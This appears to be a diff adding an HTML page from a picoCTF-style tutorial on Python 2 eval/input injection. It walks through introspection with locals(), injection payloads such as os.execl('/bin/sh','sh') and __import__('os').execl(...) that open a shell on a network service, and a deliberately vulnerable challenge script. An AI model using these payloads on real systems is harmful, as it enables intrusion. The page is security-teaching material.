@@ -1,0 +1,166 @@
+<p><html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Python eval</title>
+<link rel="stylesheet" type="text/css" href="codehilite.css" media="screen" />
+</head>
+<body></p>
+<h2>Part 3</h2>
+<h3>Introspection</h3>
+<p>Looks like you've got the basics down! Time to introduce a new tool: <a href="http://docs.python.org/2/library/functions.html#locals"><code>locals()</code></a> and <a href="http://docs.python.org/2/library/functions.html#globals"><code>globals()</code></a>. These built-in Python functions let you view and edit the local and global scope as dictionaries. For example, in a Python interpreter:</p>
+<div class="codehilite"><pre><span class="o">&gt;&gt;&gt;</span> <span class="nb">locals</span><span class="p">()</span>
+<span class="p">{</span><span class="s">&#39;__builtins__&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s">&#39;__builtin__&#39;</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s">&#39;__name__&#39;</span><span class="p">:</span>
+ <span class="s">&#39;__main__&#39;</span><span class="p">,</span> <span class="s">&#39;__doc__&#39;</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span> <span class="s">&#39;__package__&#39;</span><span class="p">:</span> <span class="bp">None</span><span class="p">}</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">4</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">5</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">locals</span><span class="p">()</span>
+<span class="p">{</span><span class="s">&#39;__builtins__&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s">&#39;__builtin__&#39;</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s">&#39;__package__&#39;</span><span class="p">:</span>
+ <span class="bp">None</span><span class="p">,</span> <span class="s">&#39;x&#39;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span> <span class="s">&#39;y&#39;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="s">&#39;__name__&#39;</span><span class="p">:</span> <span class="s">&#39;__main__&#39;</span><span class="p">,</span> <span class="s">&#39;__doc__&#39;</span><span class="p">:</span> <span class="bp">None</span><span class="p">}</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">locals</span><span class="p">()[</span><span class="s">&#39;x&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="nb">locals</span><span class="p">()[</span><span class="s">&#39;y&#39;</span><span class="p">]</span>
+<span class="mi">9</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">locals</span><span class="p">()</span> <span class="o">==</span> <span class="nb">globals</span><span class="p">()</span> <span class="c"># This is true outside functions</span>
+<span class="bp">True</span>
+<span class="o">&gt;&gt;&gt;</span>
+</pre></div>
+
+
+<p>You can <a href="https://www.google.com/search?q=python+locals+and+globals">google</a> for examples on their normal usage, and play around with them a bit in the Python interpreter.</p>
+<p>Do you remember the code for example1.py? It doesn't matter. This is what happens if you type <code>locals()</code> at the prompt:</p>
+<div class="codehilite"><pre>$ python ./example1.py
+Guess the number! 1 to 100.
+Your guess&gt; locals()
+Nope, {&#39;guess&#39;: {...}, &#39;randint&#39;: &lt;bound method Random.randint of
+ &lt;random.Random object at 0x7faada071820&gt;&gt;, &#39;__builtins__&#39;:
+ &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;./example1.py&#39;,
+ &#39;__package__&#39;: None, &#39;num&#39;: 35, &#39;__name__&#39;: &#39;__main__&#39;,
+ &#39;__doc__&#39;: None} is wrong.
+Your guess&gt; 35
+You win!
+$
+</pre></div>
+
+
+<p>Oh, would you look at that: <code>'num': 35</code> sitting right there. We didn't even need to see the source to know that there was a variable named <code>num</code>!</p>
+<p>There's more sorts of introspection you can do in Python: <code>vars</code>, <code>__dict__</code>, <code>func_globals</code> and <code>__subclasses__</code> come to mind. If you google about more information on those, you may find them useful in the tasks to come!</p>
+<h3>Popping a shell</h3>
+<p>When a hacker exploits an <code>eval</code> vulnerability in the real world, it's probably not to read some <code>magic_number</code> variable. Instead, the goal to gain full control over the computer. Consider the following example:</p>
+<div class="codehilite"><pre><span class="c"># example2.py</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="k">print</span> <span class="s">&quot;What files do you want?&quot;</span>
+<span class="n">files</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">&#39;list&gt; &#39;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
+  <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+      <span class="k">print</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span> <span class="n">name</span><span class="p">,</span> <span class="s">&quot;does not exist!&quot;</span>
+</pre></div>
+
+
+<p>This script just prints out files, which in many circumstances would be a security vulnerability in itself! However, it's a lot worse then that, due to the <code>os</code> module being available to use:</p>
+<div class="codehilite"><pre>$ python example2.py
+What files do you want?
+list&gt; os.system(&quot;echo &#39;I have a shell.&#39;&quot;)
+I have a shell.
+Traceback (most recent call last):
+  File &quot;example2.py&quot;, line 5, in &lt;module&gt;
+    for name in files:
+TypeError: &#39;int&#39; object is not iterable
+$
+</pre></div>
+
+
+<p>The <a href="http://docs.python.org/2/library/os.html#os.system"><code>os.system</code></a> pretty much just takes a string an runs it as a shell command&emdash;which, as you may know, allows you to do anything on the system. This isn't very interesting here because we already <em>had</em> a shell (the one where we ran <code>python example2.py</code> on), but if a python network service using <code>os</code> and <code>eval</code> were running on a network...</p>
+<div class="codehilite"><pre>$ nc pyservice.example.com 1234
+What files do you want?
+list&gt; os.execl(&#39;/bin/sh&#39;,&#39;sh&#39;)
+sh-3.2$ echo &quot;I have a shell.&quot;
+I have a shell.
+sh-3.2$ exit
+exit
+$
+</pre></div>
+
+
+<p>Here, I used the <a href="http://docs.python.org/2/library/os.html#os.execl"><code>os.execl</code></a> functions. The <code>exec</code> family of functions essentially replace the service with another program, which we can choose to be a UNIX shell program; it's a little weird and you can read more about it on <a href="http://en.wikipedia.org/wiki/Exec_(operating_system)">Wikipedia</a>. This is more convenient than <code>os.system</code> in some cases.</p>
+<h3>__import__</h3>
+<p>One last thing to know about: scripts aren't safe just because they don't have <code>import os</code> anywhere, because we can <code>import os</code> ourselves! Consider the following example (which is similar to example2.py):</p>
+<div class="codehilite"><pre><span class="c"># example3.py</span>
+<span class="k">print</span> <span class="s">&quot;What files do you want?&quot;</span>
+<span class="n">files</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">&#39;list&gt; &#39;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
+  <span class="k">try</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+      <span class="k">print</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+  <span class="k">except</span><span class="p">:</span>
+    <span class="k">print</span> <span class="n">name</span><span class="p">,</span> <span class="s">&quot;does not exist!&quot;</span>
+</pre></div>
+
+
+<p>Just entering <code>import os</code> won't cut it, because <code>import os</code> is a statement and not an expression:</p>
+<div class="codehilite"><pre>$ python example3.py 
+What files do you want?
+list&gt; import os
+Traceback (most recent call last):
+  File &quot;example3.py&quot;, line 3, in &lt;module&gt;
+    files = input(&#39;list&gt; &#39;)
+  File &quot;&lt;string&gt;&quot;, line 1
+    import os
+         ^
+SyntaxError: invalid syntax
+$
+</pre></div>
+
+
+<p>Luckily for us, there's a built-in function called <a href="http://docs.python.org/2/library/functions.html#__import__"><code>__import__</code></a> that does pretty much what we want it to.</p>
+<div class="codehilite"><pre>$ python example3.py
+What files do you want?
+list&gt; __import__(&#39;os&#39;).execl(&#39;/bin/sh&#39;,&#39;sh&#39;)
+sh-3.2$ echo &#39;I win again&#39;
+I win again
+sh-3.2$ exit
+exit
+$
+</pre></div>
+
+
+<h3>Task 3</h3>
+<p>This time, there's no secret <code>flag</code> variable to read; your goal is to get a shell, <code>ls</code> to see which files you can access, and <code>cat</code> out the key from one of those files. Because <code>__import__('os').execlp('sh','sh')</code> is a little too easy, I've made this problem harder by hindering your ability to <code>__import__</code>. Some people used to think that tricks like this could make <code>eval</code> safe... but if you apply the techniques I've discussed above, it's not going to keep <code>eval</code> safe from you :)</p>
+<p>Connect to this script at <code>nc python.picoctf.com 6363</code>.</p>
+<div class="codehilite"><pre><span class="c"># task3.py</span>
+<span class="c"># Remember kids: this is bad code. Try not code like this :P</span>
+
+<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">path</span>
+<span class="k">del</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s">&#39;__import__&#39;</span><span class="p">]</span>
+<span class="k">del</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s">&#39;reload&#39;</span><span class="p">]</span>
+
+<span class="k">print</span> <span class="s">&quot;Welcome to the food menu!&quot;</span>
+<span class="n">choices</span> <span class="o">=</span> <span class="p">(</span>
+  <span class="p">(</span><span class="s">&quot;Chicken Asada Burrito&quot;</span><span class="p">,</span> <span class="mf">7.69</span><span class="p">,</span> <span class="s">&quot;caburrito.txt&quot;</span><span class="p">),</span>
+  <span class="p">(</span><span class="s">&quot;Beef Chow Mein&quot;</span><span class="p">,</span> <span class="mf">6.69</span><span class="p">,</span> <span class="s">&quot;beefchow.txt&quot;</span><span class="p">),</span>
+  <span class="p">(</span><span class="s">&quot;MeatBurger Deluxe&quot;</span><span class="p">,</span> <span class="mf">10.49</span><span class="p">,</span> <span class="s">&quot;no description&quot;</span><span class="p">),</span>
+  <span class="c"># ...</span>
+<span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">print_description</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+  <span class="k">print</span> <span class="s">&quot;&quot;</span>
+  <span class="k">if</span> <span class="n">n</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">choices</span><span class="p">):</span>
+    <span class="k">print</span> <span class="s">&quot;No such item!&quot;</span>
+  <span class="k">elif</span> <span class="ow">not</span> <span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">choices</span><span class="p">[</span><span class="n">n</span><span class="p">][</span><span class="mi">2</span><span class="p">]):</span>
+    <span class="k">print</span> <span class="s">&quot;No description yet, but we promise it&#39;s tasty!&quot;</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span> <span class="nb">open</span><span class="p">(</span><span class="n">choices</span><span class="p">[</span><span class="n">n</span><span class="p">][</span><span class="mi">2</span><span class="p">])</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">show_menu</span><span class="p">():</span>
+  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">choices</span><span class="p">)):</span>
+    <span class="k">print</span> <span class="s">&quot;[</span><span class="si">% 2d</span><span class="s">] $</span><span class="si">% 3.2f</span><span class="s"> </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">choices</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">choices</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+  <span class="k">print</span> <span class="s">&quot;Which description do you want to read?&quot;</span>
+  <span class="n">show_menu</span><span class="p">()</span>
+  <span class="n">print_description</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">&#39;&gt; &#39;</span><span class="p">))</span>
+</pre></div>
+
+
+<p></body>
+</html></p>
